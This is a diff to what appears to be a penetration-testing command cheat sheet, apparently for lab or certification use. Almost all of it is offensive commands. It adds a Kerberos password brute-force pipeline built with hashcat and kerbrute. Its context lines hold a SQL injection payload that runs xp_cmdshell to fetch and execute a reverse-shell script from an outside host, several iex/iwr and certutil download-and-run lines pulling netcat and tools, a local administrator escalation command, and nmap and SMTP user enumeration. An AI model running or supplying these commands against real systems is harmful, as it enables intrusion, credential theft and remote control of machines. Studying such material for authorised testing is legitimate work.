@@ -38,16 +38,25 @@ Elevate privileges of a user you have access to with a single command:
 Add-LocalGroupMember -Group Administrators -Member ariah
 ```
 
+Custom password list:
+
+```bash
+hashcat --stdout -a 0 -r /usr/share/hashcat/rules/best64.rule pass.txt > pass-best64.txt
+hashcat --stdout -a 0 -r /usr/share/hashcat/rules/bdg.rule pass.txt > passwords.txt
+awk 'length($0) >= 7' passwords.txt > tmp_passwords.txt && awk 'NR==FNR {a[$1]; next} {for (i in a) print $1 ":" i}' tmp_passwords.txt users.txt | grep -P '[A-Z]' | grep -P '[^a-zA-Z0-9]' > combined.txt && rm tmp_passwords.txt
+cat combined.txt| /opt/kerbrute bruteforce -d $dom --dc $ip -t 10 - 
+```
+
 ```bash
 admin' UNION SELECT 1,2; EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://192.168.45.163:8000/rev.ps1") | powershell -noprofile';--+
 
-iex(iwr -uri 192.168.45.187:8000/transfer_files.ps1 -usebasicparsing)
+iex(iwr -uri 192.168.45.238:8000/transfer_files.ps1 -usebasicparsing)
 iex(iwr -uri 10.10.14.8:8000/transfer_files.ps1 -usebasicparsing)
 curl 10.10.14.8:8000/nc.exe -o nc.exe
 
 iex(iwr -uri 192.168.49.129:8000/transfer_files.ps1 -usebasicparsing)
 
-iwr -uri 10.10.14.8:8000/transfer_files.ps1 -usebasicparsing -outfile c:\
+iwr -uri 192.168.45.238:8000/Certify.exe -usebasicparsing -outfile c:\windows\tasks\Certify.exe
 
 iex(iwr -uri 10.10.112.153:1234/transfer_files_ad.ps1 -usebasicparsing)
 certutil.exe -f -urlcache -split http://192.168.49.129:8000/nc.exe nc.exe
@@ -76,9 +85,9 @@ curl http://192.168.45.163:8000/pspy64 -o pspy64;chmod +x pspy64;./pspy64
 ```
 
 ===Nmap====
-nmap -p- -sT -sV -A $IP
+nmap -p- -sT -sV -A $ip
 nmap -p- -sC -sV $ip --open
-nmap -p- --script=vuln $IP
+nmap -p- --script=vuln $ip
 ###HTTP-Methods
 nmap --script http-methods --script-args http-methods.url-path='/website' 
 ###  --script smb-enum-shares
@@ -162,10 +171,10 @@ theharvester -d domain.org -l 500 -b google
 nmap -p80,443 --script=http-methods  --script-args http-methods.url-path='/directory/goes/here'
 ================================================================================
 ===SMTP USER ENUM
-smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
-smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
-smtp-user-enum -M RCPT -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
-smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
+smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $ip
+smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $ip
+smtp-user-enum -M RCPT -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $ip
+smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $ip
 ================================================================================
 
 ===Command Execution Verification - [Ping check]
